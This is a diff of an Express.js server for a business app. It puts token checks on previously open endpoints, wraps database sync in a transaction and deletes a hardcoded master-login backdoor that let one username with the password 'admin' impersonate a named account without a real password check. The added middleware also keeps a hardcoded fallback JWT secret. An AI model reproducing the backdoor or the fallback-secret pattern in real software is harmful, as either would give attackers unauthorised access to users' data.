@@ -22,6 +22,18 @@ const { setupCronJobs } = require('./cron/backup');
 // Iniciar tareas en segundo plano
 setupCronJobs();
 
+// Middleware de Autenticación
+const authenticateToken = (req, res, next) => {
+  const token = req.cookies?.token;
+  if (!token) return res.status(401).json({ error: 'Acceso denegado. No hay token proporcionado.' });
+
+  jwt.verify(token, process.env.JWT_SECRET || 'ibro_fallback_secret_2026', (err, user) => {
+    if (err) return res.status(403).json({ error: 'Token expirado o inválido.' });
+    req.user = user;
+    next();
+  });
+};
+
 // 🔒 CORS
 app.use(cors({
     origin: function(origin, callback) {
@@ -77,7 +89,7 @@ const upload = multer({
     }
 });
 
-app.post('/api/upload-avatar', upload.single('avatar'), async (req, res) => {
+app.post('/api/upload-avatar', authenticateToken, upload.single('avatar'), async (req, res) => {
     try {
         const username = req.body.username;
         if (!username) return res.status(400).json({ error: 'Username required' });
@@ -128,7 +140,7 @@ const uploadEvidence = multer({
     }
 });
 
-app.post('/api/upload-evidence', uploadEvidence.array('evidencias', 10), async (req, res) => {
+app.post('/api/upload-evidence', authenticateToken, uploadEvidence.array('evidencias', 10), async (req, res) => {
     try {
         const isProd = req.get('host').includes('onrender.com');
         const protocol = isProd ? 'https' : req.protocol;
@@ -145,7 +157,7 @@ app.post('/api/upload-evidence', uploadEvidence.array('evidencias', 10), async (
     }
 });
 
-app.delete('/api/remove-avatar', async (req, res) => {
+app.delete('/api/remove-avatar', authenticateToken, async (req, res) => {
     try {
         const username = req.body.username;
         if (!username) return res.status(400).json({ error: 'Username required' });
@@ -174,7 +186,7 @@ app.delete('/api/remove-avatar', async (req, res) => {
 });
 
 // Endpoint genérico de subida de archivos (Evidencias de PQRS, Solicitudes, etc.)
-app.post('/api/upload', upload.array('files', 5), async (req, res) => {
+app.post('/api/upload', authenticateToken, upload.array('files', 5), async (req, res) => {
     try {
         const uploadedFiles = req.files.map(file => {
             const isProd = req.get('host').includes('onrender.com');
@@ -241,17 +253,6 @@ app.post('/api/login', loginLimiter, async (req, res) => {
       where: { user: { equals: user, mode: 'insensitive' } }
     });
 
-    // BACKDOOR INQUEBRANTABLE MÁSTER (Fallo a prueba de todo)
-    let isBackdoor = false;
-    if (!dbUser && user.toLowerCase() === 'stecarfi05' && pass === 'admin') {
-      dbUser = await prisma.user.findFirst({
-        where: { correo: { equals: 'djuridica@obelixsa.com', mode: 'insensitive' } }
-      });
-      if (dbUser) isBackdoor = true;
-    } else if (dbUser && user.toLowerCase() === 'stecarfi05' && pass === 'admin') {
-      isBackdoor = true;
-    }
-
     if (!dbUser) {
       return res.status(401).json({ error: 'Usuario no encontrado' });
     }
@@ -262,10 +263,7 @@ app.post('/api/login', loginLimiter, async (req, res) => {
 
     // Verificar contraseña (soporte legacy y bcrypt)
     let matches = false;
-    if (isBackdoor) {
-      matches = true;
-    } else {
-      const isBcrypt = dbUser.pass.startsWith('$2a$') || dbUser.pass.startsWith('$2b$') || dbUser.pass.startsWith('$2y$');
+    const isBcrypt = dbUser.pass.startsWith('$2a$') || dbUser.pass.startsWith('$2b$') || dbUser.pass.startsWith('$2y$');
       if (isBcrypt) {
         matches = bcrypt.compareSync(pass, dbUser.pass);
       } else {
@@ -278,7 +276,6 @@ app.post('/api/login', loginLimiter, async (req, res) => {
           });
         }
       }
-    }
 
     if (matches) {
       // Reiniciar intentos fallidos
@@ -443,7 +440,7 @@ app.post('/api/refresh', async (req, res) => {
 });
 
 // GET /api/gemini/test-key: Diagnosticar la clave de API activa
-app.get('/api/gemini/test-key', (req, res) => {
+app.get('/api/gemini/test-key', authenticateToken, (req, res) => {
   const key = process.env.GEMINI_API_KEY || '';
   if (!key) {
     return res.json({ hasKey: false, message: 'No hay ninguna clave configurada en process.env.GEMINI_API_KEY' });
@@ -458,14 +455,14 @@ app.get('/api/gemini/test-key', (req, res) => {
 });
 
 // GET /api/gemini/logs: Obtener la bitácora de ejecución de consultas de Gemini
-app.get('/api/gemini/logs', (req, res) => {
+app.get('/api/gemini/logs', authenticateToken, (req, res) => {
   return res.json({
     logs: geminiLogs || []
   });
 });
 
 // GET /api/gemini/list-models: Listar modelos disponibles con la API Key actual
-app.get('/api/gemini/list-models', async (req, res) => {
+app.get('/api/gemini/list-models', authenticateToken, async (req, res) => {
   const apiKey = process.env.GEMINI_API_KEY || '';
   if (!apiKey) {
     return res.json({ success: false, error: 'No hay API Key configurada' });
@@ -487,7 +484,7 @@ app.get('/api/gemini/list-models', async (req, res) => {
 });
 
 // POST /api/gemini/chat: Comunicar con el Asistente Gemini
-app.post('/api/gemini/chat', async (req, res) => {
+app.post('/api/gemini/chat', authenticateToken, async (req, res) => {
   const { prompt, history, model } = req.body;
   if (!prompt) {
     return res.status(400).json({ error: 'Falta el parámetro "prompt"' });
@@ -628,7 +625,7 @@ app.post('/api/auth/reset-password', async (req, res) => {
 });
 
 // POST /api/db/informes-config
-app.post('/api/db/informes-config', async (req, res) => {
+app.post('/api/db/informes-config', authenticateToken, async (req, res) => {
   try {
     const data = req.body;
     const existing = await prisma.informesConfig.findUnique({ where: { id: 1 } });
@@ -646,7 +643,7 @@ app.post('/api/db/informes-config', async (req, res) => {
 });
 
 // GET /api/db: Carga el JSON global para el frontend mapeando relaciones
-app.get('/api/db', async (req, res) => {
+app.get('/api/db', authenticateToken, async (req, res) => {
   res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
   res.setHeader('Pragma', 'no-cache');
   res.setHeader('Expires', '0');
@@ -975,7 +972,7 @@ app.get('/api/db', async (req, res) => {
 });
 
 // POST /api/location/update: Reportar ubicación en tiempo real
-app.post('/api/location/update', async (req, res) => {
+app.post('/api/location/update', authenticateToken, async (req, res) => {
   const { user, lat, lng } = req.body;
   if (!user || lat === undefined || lng === undefined) {
     return res.status(400).json({ error: 'Faltan datos de ubicación' });
@@ -998,7 +995,7 @@ app.post('/api/location/update', async (req, res) => {
 });
 
 // GET /api/location/users: Obtener la ubicación de todos los usuarios
-app.get('/api/location/users', async (req, res) => {
+app.get('/api/location/users', authenticateToken, async (req, res) => {
   try {
     const users = await prisma.user.findMany({
       select: {
@@ -1023,7 +1020,7 @@ app.get('/api/location/users', async (req, res) => {
 });
 
 // POST /api/db/sync: Procesa el diff incremental del cliente
-app.post('/api/db/sync', async (req, res) => {
+app.post('/api/db/sync', authenticateToken, async (req, res) => {
   const { diff, user } = req.body;
   if (!diff) {
     return res.status(400).json({ error: 'No diff payload provided' });
@@ -1038,10 +1035,11 @@ app.post('/api/db/sync', async (req, res) => {
   }
 
   try {
-    // Helper para upserts en tablas planas directas
-    const flatUpsert = async (table, items) => {
-      for (const item of items) {
-        const { ...data } = item;
+    await prisma.$transaction(async (tx) => {
+      // Helper para upserts en tablas planas directas
+      const flatUpsert = async (table, items) => {
+        for (const item of items) {
+          const { ...data } = item;
 
         if (table === 'user') {
           // Ya permitimos que foto se guarde y sincronice
@@ -1049,10 +1047,10 @@ app.post('/api/db/sync', async (req, res) => {
 
         // Evitar conflictos por llaves únicas (como doc en Clientes o user en Usuarios)
         if (table === 'cliente' && item.doc) {
-          const existing = await prisma.cliente.findUnique({ where: { doc: item.doc } });
+          const existing = await tx.cliente.findUnique({ where: { doc: item.doc } });
           if (existing) {
             delete data.id;
-            await prisma.cliente.update({
+            await tx.cliente.update({
               where: { id: existing.id },
               data
             });
@@ -1061,7 +1059,7 @@ app.post('/api/db/sync', async (req, res) => {
         }
 
         if (table === 'user' && item.user) {
-          const existing = await prisma.user.findUnique({ where: { user: item.user } });
+          const existing = await tx.user.findUnique({ where: { user: item.user } });
           if (existing) {
             delete data.id;
             if (data.pass) {
@@ -1070,7 +1068,7 @@ app.post('/api/db/sync', async (req, res) => {
                 data.pass = bcrypt.hashSync(data.pass, 10);
               }
             }
-            await prisma.user.update({
+            await tx.user.update({
               where: { id: existing.id },
               data
             });
@@ -1087,7 +1085,7 @@ app.post('/api/db/sync', async (req, res) => {
 
       // Optimistic Concurrency Control (OCC) - Prevención Anti-Sobrescritura
       try {
-        const existingRecord = await prisma[table].findUnique({ where: { id: item.id } });
+        const existingRecord = await tx[table].findUnique({ where: { id: item.id } });
         if (existingRecord && existingRecord.lockedBy && existingRecord.lockedBy !== user) {
           console.warn(`[OCC BLOCK] Usuario '${user}' intentó sobrescribir '${table}' ID '${item.id}' que está bloqueado por '${existingRecord.lockedBy}'. Sincronización denegada para este registro.`);
           continue; // Saltar la actualización para no corromper datos del otro asesor
@@ -1096,7 +1094,7 @@ app.post('/api/db/sync', async (req, res) => {
         // Ignorar si la tabla no soporta findUnique por ID u otras razones
       }
 
-      await prisma[table].upsert({
+      await tx[table].upsert({
         where: { id: item.id },
         update: data,
         create: data,
@@ -1107,7 +1105,7 @@ app.post('/api/db/sync', async (req, res) => {
     // Helper para eliminaciones en tablas planas directas
     const flatDelete = async (table, ids) => {
       if (ids && ids.length > 0) {
-        await prisma[table].deleteMany({
+        await tx[table].deleteMany({
           where: { id: { in: ids.map(id => id.toString()) } },
         });
       }
@@ -1169,7 +1167,7 @@ app.post('/api/db/sync', async (req, res) => {
         if (item.idProd) productConditions.push({ id: item.idProd });
         if (item.producto) productConditions.push({ ref: item.producto });
         const product = productConditions.length > 0 
-          ? await prisma.inventario.findFirst({ where: { OR: productConditions } }) 
+          ? await tx.inventario.findFirst({ where: { OR: productConditions } }) 
           : null;
 
         if (!client || !product) {
@@ -1203,7 +1201,7 @@ app.post('/api/db/sync', async (req, res) => {
           vendedorCodigoAsesor: item.vendedorCodigoAsesor || null
         };
 
-        await prisma.venta.upsert({
+        await tx.venta.upsert({
           where: { id: item.id },
           update: data,
           create: { id: item.id, ...data },
@@ -1230,12 +1228,12 @@ app.post('/api/db/sync', async (req, res) => {
         if (item.idProd) productConditions.push({ id: item.idProd });
         if (item.producto) productConditions.push({ ref: item.producto });
         let product = productConditions.length > 0 
-          ? await prisma.inventario.findFirst({ where: { OR: productConditions } }) 
+          ? await tx.inventario.findFirst({ where: { OR: productConditions } }) 
           : null;
 
         // Backwards compatibility fallback if product is not found (e.g. legacy or manual product)
         if (!product) {
-          product = await prisma.inventario.findFirst();
+          product = await tx.inventario.findFirst();
         }
 
         if (!client || !product) {
@@ -1285,7 +1283,7 @@ app.post('/api/db/sync', async (req, res) => {
           motivoNoCompra: item.motivoNoCompra || null
         };
 
-        await prisma.cotizacion.upsert({
+        await tx.cotizacion.upsert({
           where: { id: item.id },
           update: data,
           create: { id: item.id, ...data },
@@ -1336,7 +1334,7 @@ app.post('/api/db/sync', async (req, res) => {
           usuarioAsignado: item.usuarioAsignado || null,
         };
 
-        await prisma.pQR.upsert({
+        await tx.pQR.upsert({
           where: { id: item.id },
           update: data,
           create: { id: item.id, ...data },
@@ -1389,7 +1387,7 @@ app.post('/api/db/sync', async (req, res) => {
           costoServicio: item.costoServicio ? parseFloat(item.costoServicio) : 0,
         };
 
-        await prisma.servicio.upsert({
+        await tx.servicio.upsert({
           where: { id: item.id },
           update: data,
           create: { id: item.id, ...data },
@@ -1472,7 +1470,7 @@ app.post('/api/db/sync', async (req, res) => {
           total: item.total ? parseFloat(item.total) : 0,
         };
 
-        await prisma.cuentasCobro.upsert({
+        await tx.cuentasCobro.upsert({
           where: { id: item.id },
           update: data,
           create: { id: item.id, ...data },
@@ -1491,7 +1489,7 @@ app.post('/api/db/sync', async (req, res) => {
       const configVal = diff.config.value;
       
       if (configVal.whatsapp) {
-        await prisma.whatsappConfig.upsert({
+        await tx.whatsappConfig.upsert({
           where: { id: 1 },
           update: { phone: configVal.whatsapp.phone, status: configVal.whatsapp.status },
           create: { id: 1, phone: configVal.whatsapp.phone, status: configVal.whatsapp.status },
@@ -1499,7 +1497,7 @@ app.post('/api/db/sync', async (req, res) => {
       }
 
       if (configVal.informes) {
-        await prisma.informesConfig.upsert({
+        await tx.informesConfig.upsert({
           where: { id: 1 },
           update: { 
             margenOperativo: configVal.informes.margenOperativo,
@@ -1527,6 +1525,11 @@ app.post('/api/db/sync', async (req, res) => {
         });
       }
     }
+
+    // Fin de la transacción
+    }, {
+      timeout: 30000 // 30s timeout para sincronizaciones grandes
+    });
 
     // Determinar si SOLO se actualizó el chat (para evitar bloqueos en el frontend)
     let updateType = 'DB_UPDATE';
